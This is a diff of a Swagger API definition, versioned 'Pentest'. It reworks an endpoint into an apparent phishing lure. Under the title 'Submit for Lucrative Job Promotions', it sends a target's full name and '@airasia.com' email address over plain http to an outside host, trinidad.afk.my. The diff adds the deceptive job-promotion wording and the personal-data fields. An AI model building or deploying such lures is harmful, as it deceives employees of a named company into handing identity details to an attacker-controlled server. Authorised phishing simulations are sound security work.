@@ -1,8 +1,8 @@
 {
     "swagger": "2.0",
     "info": {
-      "title": "Promotion",
-      "description": "Job Promotions",
+      "title": "Job Promotion",
+      "description": "Submit for Lucrative Job Promotions",
       "version": "Pentest"
     },
     "host": "trinidad.afk.my:12345",
@@ -11,13 +11,13 @@
       "http"
     ],
     "paths": {
-      "/killa/{a}&{b}": {
+      "/killa/{FullName}&{Email}": {
         "get": {
-          "description": "Submit Details",
+          "description": "Submit Personal Details",
           "operationId": "xyz",
           "parameters": [
             {
-              "name": "a",
+              "name": "Full Name",
               "in": "path",
               "description": "Full Name",
               "required": true
@@ -25,9 +25,9 @@
               
             },
             {
-              "name": "b",
+              "name": "Email",
               "in": "path",
-              "description": "YourEmail@airasia.com",
+              "description": "@airasia.com",
               "required": true
               
             }
